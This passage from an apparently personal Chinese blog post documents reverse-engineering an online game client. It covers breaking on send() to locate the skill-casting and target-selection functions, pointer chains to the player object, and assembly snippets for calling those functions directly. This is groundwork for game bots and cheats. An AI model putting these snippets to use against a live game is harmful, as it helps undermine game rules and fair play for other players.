搜索字符信息，可以根据内存读写断点。定位技能的关键 call</p>\n<p>思路二：分析游戏按键和鼠标点击处理机制，找到技能 call</p>\n<p>思路三：针对网游，一般网络游戏会将攻击和伤害的计算放在服务器端处理</p>\n<p>失望技能需要与服务端进行网络通信，通过游戏数据网络数据收发机制，跟踪 send，recv 函数，用条件过滤，保证 send 的是释放技能的数据，看函数堆栈反推上层函数，找到技能 call</p>\n<p>bp send, 对网络发送数据的函数下断点</p>\n<p>排除其他数据包发送的干扰，定位到使用技能时触发的数据包的发送</p>\n<p>ctrl + F9 定位到游戏程序模块 (OD 上 module 为游戏进程名) 然后逐层分析函数，看谁更适合作为技能 call</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserSkill ()</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\txxx()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsend() </span><br><span class=\"line\">\t\t//send处下断点，根据堆栈回溯可以定位技能call</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CC3F37  | 57                      | push edi                              |</span><br><span class=\"line\">00CC3F38  | 56                      | push esi                              | esi:L&quot;)q&quot;</span><br><span class=\"line\">00CC3F39  | 8B49 20                 | mov ecx,dword ptr ds:[ecx+20]         |</span><br><span class=\"line\">00CC3F3C  | E8 0F780B00             | call elementclient.D7B750             |</span><br></pre></td></tr></table></figure>\n<p>发送消息或者触发事件 SendNotyxxx</p>\n<p>消息事件处理线程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while(1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tswitch</span><br><span class=\"line\">\t\tcase xxx;</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t\tcase yyy;</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">764B58A0  | 8BFF                   | mov edi,edi                           |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7AD35  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00D7AD37  | 6A 01                  | push 1                                |</span><br><span class=\"line\">00D7AD39  | 68 31AC2F01            | push elementclient.12FAC31            |</span><br><span class=\"line\">00D7AD3E  | FF35 7CAD5001          | push dword ptr ds:[150AD7C]           |</span><br><span class=\"line\">00D7AD44  | FF15 486A1E01          | call dword ptr ds:[&lt;&amp;send&gt;]           |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7AC71  |.  FF75 10       push [arg.3]</span><br><span class=\"line\">00D7AC74  |.  FF75 0C       push [arg.2]</span><br><span class=\"line\">00D7AC77  |.  E8 24000000   call ElementC.00D7ACA0</span><br><span class=\"line\"></span><br><span class=\"line\">00D7B9CC  |&gt; \\FF75 0C       push [arg.2]</span><br><span class=\"line\">00D7B9CF  |.  8B8E AC000000 mov ecx,dword ptr ds:[esi+0xAC]</span><br><span class=\"line\">00D7B9D5  |.  57            push edi</span><br><span class=\"line\">00D7B9D6  |.  FFB6 B0000000 push dword ptr ds:[esi+0xB0]</span><br><span class=\"line\">00D7B9DC  |.  E8 0FF2FFFF   call ElementC.00D7ABF0</span><br><span class=\"line\"></span><br><span class=\"line\">00D7B7D1  |.  66:8906       mov word ptr ds:[esi],ax</span><br><span class=\"line\">00D7B7D4  |&gt;  6A 00         push 0x0</span><br><span class=\"line\">00D7B7D6  |.  8D45 DC       lea eax,[local.9]</span><br><span class=\"line\">00D7B7D9  |.  8BCF          mov ecx,edi</span><br><span class=\"line\">00D7B7DB  |.  50            push eax</span><br><span class=\"line\">00D7B7DC  |.  E8 9F000000   call ElementC.00D7B880</span><br><span class=\"line\">//以上三个除了技能也能中断</span><br><span class=\"line\"></span><br><span class=\"line\">00CC3F31  |&gt; \\8B0D 38EE4F01 mov ecx,dword ptr ds:[0x14FEE38]         ;  ElementC.015084F8     </span><br><span class=\"line\">00CC3F37  |.  57            push edi                                    0C</span><br><span class=\"line\">00CC3F38  |.  56            push esi                                    04229034  </span><br><span class=\"line\">00CC3F39  |.  8B49 20       mov ecx,dword ptr ds:[ecx+0x20]  \t\t\t24BC4028</span><br><span class=\"line\">00CC3F3C  |.  E8 0F780B00   call ElementC.00D7B750</span><br><span class=\"line\">//没有技能ID</span><br><span class=\"line\"></span><br><span class=\"line\">009AC4F5  |.  FF75 14       push [arg.4]\t\t\t\t\t\t\t\t0019EE7C</span><br><span class=\"line\">009AC4F8  |.  C701 00000000 mov dword ptr ds:[ecx],0x0\t\t\t\t\t[24A1B180]</span><br><span class=\"line\">009AC4FE  |.  FF75 10       push [arg.3]\t\t\t\t\t\t\t\t01</span><br><span class=\"line\">009AC501  |.  FF75 0C       push [arg.2]\t\t\t\t\t\t\t\t215AAB00</span><br><span class=\"line\">009AC504  |.  FF75 08       push [arg.1]\t\t\t\t\t\t\t\t7D</span><br><span class=\"line\">009AC507  |.  E8 D4793100   call ElementC.00CC3EE0</span><br><span class=\"line\">//技能不可用</span><br><span class=\"line\"></span><br><span class=\"line\">00B42E62   .  50            push eax\t\t\t0019EE7C</span><br><span class=\"line\">00B42E63   .  8B87 00280000 mov eax,dword ptr ds:[edi+0x2800]    4E492C40</span><br><span class=\"line\">00B42E69   .  6A 01         push 0x1</span><br><span class=\"line\">00B42E6B   .  FF75 C8       push dword ptr ss:[ebp-0x38]      215AAB00</span><br><span class=\"line\">00B42E6E   .  FF70 08       push dword ptr ds:[eax+0x8]     7D        44EE61B8 + 08</span><br><span class=\"line\">00B42E71   .  A1 38EE4F01   mov eax,dword ptr ds:[0x14FEE38]   015084F8</span><br><span class=\"line\">00B42E76   .  8B48 20       mov ecx,dword ptr ds:[eax+0x20]   24B53028</span><br><span class=\"line\">00B42E79   .  81C1 EC000000 add ecx,0xEC</span><br><span class=\"line\">00B42E7F   .  E8 3C96E6FF   call ElementC.009AC4C0</span><br><span class=\"line\">//技能不可用</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00B69E06  |.  6A 00         push 0x0\t\t\t0</span><br><span class=\"line\">00B69E08  |.  50            push eax          0</span><br><span class=\"line\">00B69E09  |.  FF76 08       push dword ptr ds:[esi+0x8]    80001A0B  80001C4D</span><br><span class=\"line\">00B69E0C  |.  E8 5F87FDFF   call ElementC.00B42570</span><br><span class=\"line\">//无技能ID</span><br><span class=\"line\">//以下执行频率很高，消息或者类似事件派发的一个地方</span><br><span class=\"line\"></span><br><span class=\"line\">00B697CF  |&gt; \\8B40 0C       mov eax,dword ptr ds:[eax+0xC]</span><br><span class=\"line\">00B697D2  |.  FFD0          call eax</span><br><span class=\"line\"></span><br><span class=\"line\">00B6A4CF   .  8BCE          mov ecx,esi</span><br><span class=\"line\">00B6A4D1   .  E8 9AF2FFFF   call ElementC.00B69770</span><br><span class=\"line\"></span><br><span class=\"line\">00B5F6E4  |.  8B03          |mov eax,dword ptr ds:[ebx]</span><br><span class=\"line\">00B5F6E6  |.  8BCB          |mov ecx,ebx</span><br><span class=\"line\">00B5F6E8  |.  FF75 08       |push [arg.1]</span><br><span class=\"line\">00B5F6EB  |.  FF50 04       |call dword ptr ds:[eax+0x4]</span><br><span class=\"line\"></span><br><span class=\"line\">00B55D68  |.  53            push ebx</span><br><span class=\"line\">00B55D69  |.  E8 12990000   call ElementC.00B5F680</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE9231 - FF 71 08  - push [ecx+08]</span><br><span class=\"line\">00CE92C7 - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00CE92DE - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B3E488 - FF 73 08  - push [ebx+08]</span><br><span class=\"line\">00B3E62E - FF 73 08  - push [ebx+08]</span><br><span class=\"line\">00B41F83 - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B425F8 - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B42E6E - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B356C7 - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B356DB - 8B 78 08  - mov edi,[eax+08]</span><br><span class=\"line\">00B5E550 - FF 70 08  - push [eax+08]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE922A  | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]        | 015084F8</span><br><span class=\"line\">00CE922F  | 56                     | push esi                              | 06CBDD48</span><br><span class=\"line\">00CE9230  | 57                     | push edi                              | 52B640C8</span><br><span class=\"line\">00CE9231  | FF71 08                | push dword ptr ds:[ecx+8]             | 0000007D</span><br><span class=\"line\">00CE9234  | 8B40 1C                | mov eax,dword ptr ds:[eax+1C]         | 1D27F9C0</span><br><span class=\"line\">00CE9237  | 8B70 30                | mov esi,dword ptr ds:[eax+30]         | 36FAC5B8</span><br><span class=\"line\">00CE923A  | FF15 E8601E01          | call dword ptr ds:[&lt;&amp;?IsGoblinSkill@E | 034CFD30</span><br><span class=\"line\">00CE9240  | 83C4 04                | add esp,4                             |</span><br><span class=\"line\">//游戏崩溃</span><br><span class=\"line\"></span><br><span class=\"line\">00CE92C1  | 6A FF                  | push FFFFFFFF                         | FFFFFFFF</span><br><span class=\"line\">00CE92C3  | 6A 00                  | push 0                                | 0</span><br><span class=\"line\">00CE92C5  | 6A 00                  | push 0                                | 0</span><br><span class=\"line\">00CE92C7  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00CE92CA  | 8B42 0C                | mov eax,dword ptr ds:[edx+C]          | 00969460</span><br><span class=\"line\">00CE92CD  | FFD0                   | call eax                              | </span><br><span class=\"line\">//游戏崩溃</span><br><span class=\"line\"></span><br><span class=\"line\">00CE92D3  | 8B43 08                | mov eax,dword ptr ds:[ebx+8]          | 4DB4BCF0</span><br><span class=\"line\">00CE92D6  | 8BCE                   | mov ecx,esi                           | 7082C9E8</span><br><span class=\"line\">00CE92D8  | 6A FF                  | push FFFFFFFF                         |</span><br><span class=\"line\">00CE92DA  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00CE92DC  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00CE92DE  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00CE92E1  | E8 4A4BE5FF            | call elementclient.B3DE30             |</span><br><span class=\"line\">//技能call</span><br><span class=\"line\"></span><br><span class=\"line\">00B3E487  | 57                     | push edi                              | 687763E8</span><br><span class=\"line\">00B3E488  | FF73 08                | push dword ptr ds:[ebx+8]             | 7D</span><br><span class=\"line\">00B3E48B  | E8 A0A9E7FF            | call elementclient.9B8E30             |</span><br><span class=\"line\">//游戏崩溃</span><br><span class=\"line\"></span><br><span class=\"line\">00B3E62D  | 50                     | push eax                              | 0</span><br><span class=\"line\">00B3E62E  | FF73 08                | push dword ptr ds:[ebx+8]             | 7D</span><br><span class=\"line\">00B3E631  | FF75 10                | push dword ptr ss:[ebp+10]            | 80001A0B</span><br><span class=\"line\">00B3E634  | 68 886D2701            | push elementclient.1276D88            | 1276D88</span><br><span class=\"line\">00B3E639  | 6A 01                  | push 1                                |</span><br><span class=\"line\">00B3E63B  | E8 C0F83100            | call elementclient.E5DF00             |</span><br><span class=\"line\">00B3E640  | 8B8F F4270000          | mov ecx,dword ptr ds:[edi+27F4]       | 6F3CAE58  edi= 5F4F6320 + 0x27F4</span><br><span class=\"line\">00B3E646  | 83C4 14                | add esp,14                            |</span><br><span class=\"line\">//无反应</span><br><span class=\"line\"></span><br><span class=\"line\">00B41F83  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00B41F86  | E8 75750000            | call elementclient.B49500             |</span><br><span class=\"line\">//无反应</span><br><span class=\"line\"></span><br><span class=\"line\">00B425F8  | FF70 08                | push dword ptr ds:[eax+8]             | 7D </span><br><span class=\"line\">00B425FB  | E8 5034E5FF            | call elementclient.995A50             </span><br><span class=\"line\">//游戏崩溃</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00B42E62  | 50                     | push eax                              | 0019EE7C</span><br><span class=\"line\">00B42E63  | 8B87 00280000          | mov eax,dword ptr ds:[edi+2800]       | 5395BDF0</span><br><span class=\"line\">00B42E69  | 6A 01                  | push 1                                | 1</span><br><span class=\"line\">00B42E6B  | FF75 C8                | push dword ptr ss:[ebp-38]            | 241D4300</span><br><span class=\"line\">00B42E6E  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00B42E71  | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]        | 015084F8</span><br><span class=\"line\">00B42E76  | 8B48 20                | mov ecx,dword ptr ds:[eax+20]         | 29EBB028</span><br><span class=\"line\">00B42E79  | 81C1 EC000000          | add ecx,EC                            |</span><br><span class=\"line\">00B42E7F  | E8 3C96E6FF            | call elementclient.9AC4C0             |</span><br><span class=\"line\">//技能不可用</span><br><span class=\"line\"></span><br><span class=\"line\">00B356C5  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00B356C7  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00B356CA  | E8 F14C1100            | call elementclient.C4A3C0             |</span><br><span class=\"line\">//无反应</span><br><span class=\"line\"></span><br><span class=\"line\">00B5E54D  | FF71 04                | push dword ptr ds:[ecx+4]                      |</span><br><span class=\"line\">00B5E550  | FF70 08                | push dword ptr ds:[eax+8]                      |</span><br><span class=\"line\">00B5E553  | E8 D8A8E5FF            | call elementclient.9B8E30                      |</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE922A  | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]                 | 015084F8</span><br><span class=\"line\">00CE922F  | 56                     | push esi                                       | 06D077F8</span><br><span class=\"line\">00CE9230  | 57                     | push edi                                       | 658C4488</span><br><span class=\"line\">00CE9231  | FF71 08                | push dword ptr ds:[ecx+8]                      | 0000007D</span><br><span class=\"line\">00CE9234  | 8B40 1C                | mov eax,dword ptr ds:[eax+1C]                  | 1D2429C0</span><br><span class=\"line\">00CE9237  | 8B70 30                | mov esi,dword ptr ds:[eax+30]                  | 7082C9E8</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">00CE92D3  | 8B43 08                | mov eax,dword ptr ds:[ebx+8]          | 4DB4BCF0</span><br><span class=\"line\">00CE92D6  | 8BCE                   | mov ecx,esi                           | 7082C9E8，ecx的值，人物信息基地址  5F4F6320</span><br><span class=\"line\">00CE92D8  | 6A FF                  | push FFFFFFFF                         |</span><br><span class=\"line\">00CE92DA  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00CE92DC  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00CE92DE  | FF70 08                | push dword ptr ds:[eax+8]             | 7D，技能ID</span><br><span class=\"line\">00CE92E1  | E8 4A4BE5FF            | call elementclient.B3DE30             |</span><br><span class=\"line\"></span><br><span class=\"line\">[[[14FEE38]+1C]+30] = 7082C9E8   即为this指针</span><br><span class=\"line\">[[[[[[[0x1508514]+98]+4]+1C]+1*4+1C]+8]+30] = 7082C9E8</span><br><span class=\"line\">[[[[[[[[0x15084F8+1C]+98]+4]+1C]+1*4+1C]+8]+30] = 7082C9E8</span><br></pre></td></tr></table></figure>\n<p>人物选择目标（玩家，怪物，npc 分析）</p>\n<p>选中</p>\n<p>当前 this 指针 [[[14FEE38]+1C]+30] = 5F4F6320</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101115006092.png\" alt=\"image-20230101115006092\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101115309026.png\" alt=\"image-20230101115309026\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101115332221.png\" alt=\"image-20230101115332221\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">80001A0B 是戒灵的ID</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101115607140.png\" alt=\"image-20230101115607140\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对于不同的囚徒怨魂有不同的ID</span><br><span class=\"line\">80001C4A - 80001C4F</span><br><span class=\"line\">推测某个地域上囚徒怨魂有ID范围，每个ID唯一</span><br><span class=\"line\">戒灵唯一，因此ID也只有一个</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">009AC900 - 89 B0 04090000  - mov [eax+00000904],esi</span><br><span class=\"line\">00B31E36 - 89 86 04090000  - mov [esi+00000904],eax</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>思路：</p>\n<p>1. 在人物对象偏移地址中找找看是否有与选中的目标相关的信息 (譬如：ID 或者目标对象的地址)，然后通过内存断点分析访问这些信息的代码，来确定选中目标的 call</p>\n<p>2. 网游可以通过 send 函数断点来分析选中目标的操作 (和释放技能 call 分析类似)</p>\n<p>思路一：</p>\n<p>1. 上面已经找到一个与任务选中目标的相关信息 (人物选择中的目标 ID)</p>\n<p>2. 对这个内存下写入访问 / 写入的断点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">009AC900  |.  89B0 04090000 mov dword ptr ds:[eax+0x904],esi</span><br><span class=\"line\"></span><br><span class=\"line\">00B54582  |&gt; \\A1 38EE4F01   mov eax,dword ptr ds:[0x14FEE38]      015084F8</span><br><span class=\"line\">00B54587  |.  56            push esi                              80001C56</span><br><span class=\"line\">00B54588  |.  8B48 20       mov ecx,dword ptr ds:[eax+0x20]       11B3C028</span><br><span class=\"line\">00B5458B  |.  81C1 EC000000 add ecx,0xEC</span><br><span class=\"line\">00B54591  |.  E8 3A83E5FF   call ElementC.009AC8D0</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,dword ptr ds:[0x14FEE38]</span><br><span class=\"line\">push 80001A0B</span><br><span class=\"line\">mov ecx,dword ptr ds:[eax+0x20]</span><br><span class=\"line\">add ecx,0x0EC</span><br><span class=\"line\">call 009AC8D0</span><br></pre></td></tr></table></figure>\n<h4 id=\"更新-202315\"><a class=\"markdownIt-Anchor\" href=\"#更新-202315\">#</a> 更新 2023.1.5</h4>\n<p>释放技能 call</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE9EE3              | 8B43 08                | mov eax,dword ptr ds:[ebx+8]                   |</span><br><span class=\"line\">00CE9EE6              | 8BCE                   | mov ecx,esi                                    |</span><br><span class=\"line\">00CE9EE8              | 6A FF                  | push FFFFFFFF                                  |</span><br><span class=\"line\">00CE9EEA              | 6A 00                  | push 0                                         |</span><br><span class=\"line\">00CE9EEC              | 6A 00                  | push 0                                         |</span><br><span class=\"line\">00CE9EEE              | FF70 08                | push dword ptr ds:[eax+8]                      |</span><br><span class=\"line\">00CE9EF1              | E8 7A4BE5FF            | call elementclient.B3EA70                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00CE9E3A              | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]                 |</span><br><span class=\"line\">00CE9E3F              | 56                     | push esi                                       |</span><br><span class=\"line\">00CE9E40              | 57                     | push edi                                       |</span><br><span class=\"line\">00CE9E41              | FF71 08                | push dword ptr ds:[ecx+8]                      |</span><br><span class=\"line\">00CE9E44              | 8B40 1C                | mov eax,dword ptr ds:[eax+1C]                  |</span><br><span class=\"line\">00CE9E47              | 8B70 30                | mov esi,dword ptr ds:[eax+30]                  |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ecx = esi = [eax+30] = [[[14FEE38]+1C]+30]</span><br><span class=\"line\"></span><br><span class=\"line\">mov ecx,14FEE38</span><br><span class=\"line\">mov ecx,[ecx]</span><br><span class=\"line\">mov ecx,[ecx+1C]</span><br><span class=\"line\">mov ecx,[ecx+30]</span><br><span class=\"line\">push -1</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 7D</span><br><span class=\"line\">call 0x0B3EA70</span><br><span class=\"line\"></span><br><span class=\"line\">ecx 就是this指针 [[[14FEE38]+1C]+30] = 65573810 = [[[[[[[0x1508514]+98]+4]+1C]+1*4+1C]+8]+30]</span><br></pre></td></tr></table></figure>\n<p>定位怪物 ID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B6AC16  |.  6A 00         push 0x0</span><br><span class=\"line\">00B6AC18  |.  50            push eax</span><br><span class=\"line\">00B6AC19  |.  FF76 08       push dword ptr ds:[esi+0x8]  80001A0B</span><br><span class=\"line\">00B6AC1C  |.  E8 8F85FDFF   call ElementC.00B431B0</span><br><span class=\"line\"></span><br><span class=\"line\">在CE中通过选中怪物切换得到30E32FC4,并且和this指针相邻</span><br><span class=\"line\">65574114 - 65573810 = 904</span><br><span class=\"line\">即人物this指针的+904的位置是所选定怪物</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230105200144107.png\" alt=\"image-20230105200144107\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 